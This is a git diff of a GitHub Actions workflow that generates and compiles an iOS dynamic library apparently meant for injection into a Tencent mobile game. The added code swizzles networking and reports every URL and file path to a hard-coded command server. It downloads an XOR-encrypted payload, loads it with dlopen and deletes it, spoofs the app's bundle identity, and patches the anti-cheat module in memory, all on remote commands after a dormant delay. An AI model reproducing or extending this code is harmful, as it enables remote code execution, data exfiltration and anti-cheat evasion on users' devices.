@@ -14,7 +14,7 @@ jobs:
 
       - name: Generate and Compile Sovereign Core
         run: |
-          # [!] Generating Clean Source Code (Zero Arabic In-Code) to prevent encoding crashes
+          # Generating Pure English Source Code for the Dormant Core
           cat << 'EOF' > main.mm
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
@@ -24,13 +24,17 @@ jobs:
           #import <dlfcn.h>
           #import <unistd.h>
 
-          // [1] COMMAND CENTER COORDINATES (No-IP Link)
-          #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v70_pro.php?api=true"
-          #define PAYLOAD_URL @"http://jojolmlm.hopto.org/sovereign_payload.dylib"
+          // [1] COMMAND CENTER COORDINATES
+          #define SERVER_HOST @"http://16.171.230.58/dashboard_v70_pro.php"
+          #define PAYLOAD_URL @"http://16.171.230.58/sovereign_payload.dylib"
           #define WSAM_KEY 0x57 
 
-          static NSMutableArray *blockedUrls = nil;
           static BOOL isPayloadInjected = NO;
+          static BOOL isIdentitySpoofed = NO;
+          static BOOL isAceKilled = NO;
+          
+          static NSMutableArray *blockedUrls = nil;
+          static NSMutableArray *reportedFiles = nil;
 
           @interface SovereignEliteHUD : UIView
           @property (nonatomic, strong) UILabel *statusLabel;
@@ -42,52 +46,108 @@ jobs:
           @implementation SovereignEliteHUD
 
           // =========================================================
-          // [2] STABLE HOOKS (Network Only - Identity Spoofing Removed)
+          // [2] NETWORK SENSOR (Always active, but controlled)
           // =========================================================
           + (void)load {
               static dispatch_once_t onceToken;
               dispatch_once(&onceToken, ^{
                   blockedUrls = [[NSMutableArray alloc] init];
+                  reportedFiles = [[NSMutableArray alloc] init];
 
-                  // Network Interception for Recon & Blocking
+                  // Only Hook Network for Recon. Identity is NOT spoofed automatically!
                   Method origNet = class_getInstanceMethod([NSURLSession class], @selector(dataTaskWithRequest:completionHandler:));
                   Method swizNet = class_getInstanceMethod([self class], @selector(sov_dataTaskWithRequest:completionHandler:));
                   method_exchangeImplementations(origNet, swizNet);
               });
           }
 
+          - (NSString *)sov_bundleIdentifier { return @"com.tencent.ig"; }
+          - (NSString *)sov_bundlePath { return @"/var/containers/Bundle/Application/ShadowTrackerExtra.app"; }
+
           - (id)sov_dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
               NSString *url = request.URL.absoluteString;
-              [[NSNotificationCenter defaultCenter] postNotificationName:@"SovereignLog" object:url];
               
-              for (NSString *blocked in blockedUrls) {
-                  if (blocked.length > 3 && [url containsString:blocked]) return nil; 
+              // Prevent infinite loops by ignoring our own VPS IP
+              if (![url containsString:@"16.171.230.58"]) {
+                  [[NSNotificationCenter defaultCenter] postNotificationName:@"SovereignLog" object:url];
+                  
+                  // Report unknown link to Dashboard
+                  NSString *encodedUrl = [url stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
+                  NSString *reportUrl = [NSString stringWithFormat:@"%@?api=true&report_link=%@", SERVER_HOST, encodedUrl];
+                  NSURLRequest *repReq = [NSURLRequest requestWithURL:[NSURL URLWithString:reportUrl]];
+                  [[[NSURLSession sharedSession] dataTaskWithRequest:repReq completionHandler:nil] resume];
+
+                  // Sinkhole Logic (Block if commanded by Dashboard)
+                  for (NSString *blocked in blockedUrls) {
+                      if (blocked.length > 3 && [url containsString:blocked]) return nil; 
+                  }
               }
+              
               return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
           }
 
           // =========================================================
-          // [3] VOLATILE PAYLOAD ENGINE
+          // [3] DYNAMIC KILL MATRIX (Triggered ONLY by Dashboard)
+          // =========================================================
+          - (void)executeIdentitySpoof {
+              if (isIdentitySpoofed) return;
+              isIdentitySpoofed = YES;
+              
+              Class bundleClass = [NSBundle class];
+              Method origId = class_getInstanceMethod(bundleClass, @selector(bundleIdentifier));
+              Method swizId = class_getInstanceMethod([self class], @selector(sov_bundleIdentifier));
+              method_exchangeImplementations(origId, swizId);
+
+              Method origPath = class_getInstanceMethod(bundleClass, @selector(bundlePath));
+              Method swizPath = class_getInstanceMethod([self class], @selector(sov_bundlePath));
+              method_exchangeImplementations(origPath, swizPath);
+              NSLog(@"[Sovereign] Commanded: Identity Mask Enabled.");
+          }
+
+          - (void)executeAceKill {
+              if (isAceKilled) return;
+              
+              uintptr_t anogsBase = 0;
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
+              }
+
+              if (anogsBase != 0) {
+                  uintptr_t target = anogsBase + 0x10b1d2860;
+                  uint32_t ret_cmd = 0xD65F03C0; 
+                  mach_port_t task = mach_task_self();
+                  
+                  kern_return_t kr = vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+                  if (kr == KERN_SUCCESS) {
+                      vm_write(task, (vm_address_t)target, (vm_offset_t)&ret_cmd, 4);
+                      vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+                      isAceKilled = YES;
+                      NSLog(@"[Sovereign] Commanded: ACE Schedule 3 Neutalized.");
+                  }
+              }
+          }
+
+          // =========================================================
+          // [4] VOLATILE PAYLOAD (Triggered ONLY by Dashboard)
           // =========================================================
           - (void)igniteVolatilePulse {
               [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                   if (!data || data.length < 100) return;
                   
-                  // Decrypt in RAM
                   uint8_t *buffer = (uint8_t *)[data bytes];
                   NSMutableData *dec = [NSMutableData dataWithLength:data.length];
                   uint8_t *dest = (uint8_t *)[dec mutableBytes];
                   for (NSUInteger i = 0; i < data.length; i++) { dest[i] = buffer[i] ^ WSAM_KEY; }
 
-                  // Temporary birth on disk
-                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_cache_wsam.dylib"];
+                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_pulse_wsam.dylib"];
                   [dec writeToFile:path atomically:YES];
 
-                  // Injection and immediate execution
                   void *h = dlopen([path UTF8String], RTLD_NOW);
                   if (h) {
                       isPayloadInjected = YES;
-                      unlink([path UTF8String]); // TOTAL PURGE
+                      unlink([path UTF8String]); 
                       dispatch_async(dispatch_get_main_queue(), ^{
                           self.statusLabel.text = @"PAYLOAD INJECTED & PURGED";
                           self.statusLabel.textColor = [UIColor greenColor];
@@ -97,9 +157,9 @@ jobs:
           }
 
           // =========================================================
-          // [4] SAFE MEMORY PATCH ENGINE (Anti-Crash)
+          // [5] DYNAMIC MEMORY PATCHER (Triggered ONLY by Dashboard)
           // =========================================================
-          - (void)executeSovereignPatches:(NSArray *)payloads {
+          - (void)executePatches:(NSArray *)payloads {
               uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
               uintptr_t anogsBase = 0;
               uint32_t count = _dyld_image_count();
@@ -127,17 +187,14 @@ jobs:
                       unsigned char c = (unsigned char)v; [data appendBytes:&c length:1];
                   }
 
-                  // USE VM_PROT_COPY to prevent SIGKILL on iOS 18
-                  kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-                  if (kr == KERN_SUCCESS) {
-                      vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
-                      vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-                  }
+                  vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+                  vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
+                  vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
               }
           }
 
           // =========================================================
-          // [5] MOBILE UI IMPLEMENTATION
+          // [6] TACTICAL UI ENGINE
           // =========================================================
           - (instancetype)initWithFrame:(CGRect)frame {
               self = [super initWithFrame:frame];
@@ -148,14 +205,14 @@ jobs:
                   self.layer.borderWidth = 1.5;
 
                   UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 5, frame.size.width, 15)];
-                  title.text = @"SOVEREIGN ELITE v100k";
+                  title.text = @"SOVEREIGN ELITE PRO v70";
                   title.textColor = [UIColor cyanColor];
                   title.font = [UIFont boldSystemFontOfSize:9];
                   title.textAlignment = NSTextAlignmentCenter;
                   [self addSubview:title];
 
                   self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 22, 160, 20)];
-                  self.statusLabel.text = @"UPLINKING TO NO-IP...";
+                  self.statusLabel.text = @"AWAITING COMMANDS...";
                   self.statusLabel.textColor = [UIColor whiteColor];
                   self.statusLabel.font = [UIFont systemFontOfSize:10];
                   [self addSubview:self.statusLabel];
@@ -179,7 +236,7 @@ jobs:
                   self.fileTerminal.editable = NO;
                   [self addSubview:self.fileTerminal];
 
-                  [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(onLogEvent:) name:@"SovereignLog" object:nil];
+                  [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(onNetEvent:) name:@"SovereignLog" object:nil];
                   
                   [self startSyncLoop];
                   [self scanFiles];
@@ -188,7 +245,7 @@ jobs:
               return self;
           }
 
-          - (void)onLogEvent:(NSNotification *)n {
+          - (void)onNetEvent:(NSNotification *)n {
               dispatch_async(dispatch_get_main_queue(), ^{
                   self.netTerminal.text = [NSString stringWithFormat:@"%@\n> %@", self.netTerminal.text, n.object];
                   [self.netTerminal scrollRangeToVisible:NSMakeRange(self.netTerminal.text.length - 1, 1)];
@@ -200,32 +257,52 @@ jobs:
               for (uint32_t i = 0; i < count; i++) {
                   const char *name = _dyld_get_image_name(i);
                   if (name) {
-                      NSString *p = [[NSString stringWithUTF8String:name] lastPathComponent];
-                      if ([p containsString:@"Shadow"] || [p containsString:@"anogs"]) {
-                          self.fileTerminal.text = [NSString stringWithFormat:@"%@\n* %@", self.fileTerminal.text, p];
+                      NSString *fullPath = [NSString stringWithUTF8String:name];
+                      NSString *fileName = [fullPath lastPathComponent];
+                      
+                      // Report only once per file to avoid flooding VPS
+                      if (![reportedFiles containsObject:fileName]) {
+                          [reportedFiles addObject:fileName];
+                          
+                          if ([fileName containsString:@"Shadow"] || [fileName containsString:@"anogs"]) {
+                              self.fileTerminal.text = [NSString stringWithFormat:@"%@\n* %@", self.fileTerminal.text, fileName];
+                          }
+                          
+                          NSString *encPath = [fullPath stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
+                          NSString *reportUrl = [NSString stringWithFormat:@"%@?api=true&report_file=%@&path=%@", SERVER_HOST, fileName, encPath];
+                          NSURLRequest *repReq = [NSURLRequest requestWithURL:[NSURL URLWithString:reportUrl]];
+                          [[[NSURLSession sharedSession] dataTaskWithRequest:repReq completionHandler:nil] resume];
                       }
                   }
               }
           }
 
           - (void)startSyncLoop {
-              NSURL *url = [NSURL URLWithString:SERVER_API];
-              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:10.0];
+              NSString *apiUrl = [NSString stringWithFormat:@"%@?api=true", SERVER_HOST];
+              NSURLRequest *req = [NSURLRequest requestWithURL:[NSURL URLWithString:apiUrl] cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                   dispatch_async(dispatch_get_main_queue(), ^{
                       if (err || !data) return;
                       NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                       if (!json) return;
 
-                      if ([json[@"maintenance"] intValue] == 1) { [self showLock:json[@"lock_msg"]]; return; }
+                      // 1. Maintenance Lockdown Check
+                      if ([json[@"maintenance"] intValue] == 1) { [self showLockdown:json[@"lock_msg"]]; return; }
 
-                      [blockedUrls removeAllObjects];
-                      if (json[@"blocked_urls"]) [blockedUrls addObjectsFromArray:json[@"blocked_urls"]];
+                      // 2. Kill Matrix Commander (Strict obedience to Dashboard)
+                      NSArray *kill_list = json[@"kill_list"];
+                      if ([kill_list containsObject:@"verify_bundle_signature"]) { [self executeIdentitySpoof]; }
+                      if ([kill_list containsObject:@"ace_schedule3"]) { [self executeAceKill]; }
 
-                      if (json[@"payload"]) { [self executeSovereignPatches:json[@"payload"]]; }
-
-                      // Volatile Trigger
+                      // 3. Volatile Payload Trigger
                       if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }
+
+                      // 4. Update Blacklist
+                      [blockedUrls removeAllObjects];
+                      if (json[@"blocked_urls"]) { [blockedUrls addObjectsFromArray:json[@"blocked_urls"]]; }
+
+                      // 5. Apply Patches
+                      if (json[@"payload"]) { [self executePatches:json[@"payload"]]; }
 
                       self.statusLabel.text = json[@"notification"];
                       if ([json[@"status"] isEqualToString:@"safe"]) {
@@ -240,8 +317,14 @@ jobs:
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
           }
 
-          - (void)showLock:(NSString *)m {
-              UIWindow *win = [UIApplication sharedApplication].keyWindow;
+          - (void)showLockdown:(NSString *)m {
+              UIWindow *win = nil;
+              if (@available(iOS 13.0, *)) {
+                  for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
+                      if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
+                  }
+              }
+              if (!win) win = [UIApplication sharedApplication].keyWindow;
               if ([win viewWithTag:2026]) return;
               UIView *v = [[UIView alloc] initWithFrame:win.bounds];
               v.tag = 2026; v.backgroundColor = [UIColor blackColor];
@@ -253,19 +336,26 @@ jobs:
 
           - (void)enableDrag {
               self.userInteractionEnabled = YES;
-              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
+              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onPan:)];
               [self addGestureRecognizer:pan];
           }
-          - (void)onDrag:(UIPanGestureRecognizer *)s {
+          - (void)onPan:(UIPanGestureRecognizer *)s {
               CGPoint t = [s translationInView:self.superview];
               self.center = CGPointMake(self.center.x + t.x, self.center.y + t.y);
               [s setTranslation:CGPointZero inView:self.superview];
           }
           @end
 
-          void __attribute__((constructor)) start_v100k_core() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-                  UIWindow *win = [UIApplication sharedApplication].keyWindow;
+          void __attribute__((constructor)) start_wsam_pro() {
+              // 12 seconds dormant state before waking up UI
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(12 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  UIWindow *win = nil;
+                  if (@available(iOS 13.0, *)) {
+                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
+                          if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
+                      }
+                  }
+                  if (!win) win = [UIApplication sharedApplication].keyWindow;
                   if (win) {
                       SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake(40, 50, 220, 180)];
                       [win addSubview:ui];
@@ -274,9 +364,8 @@ jobs:
           }
           EOF
 
-          # [!] Stable Compilation for arm64
           export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -dynamiclib -arch arm64 main.mm -o Sovereign.dylib \
+          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Elite.dylib \
           -isysroot $SDK_PATH \
           -framework Foundation -framework UIKit -framework CoreGraphics \
           -fobjc-arc -Os -w -lc++
@@ -284,5 +373,5 @@ jobs:
       - name: Upload Sovereign Dylib
         uses: actions/upload-artifact@v4
         with:
-          name: Sovereign-v100k-Stable
-          path: Sovereign.dylib
+          name: Sovereign-Pro-v110k-Dormant
+          path: Sovereign_Elite.dylib
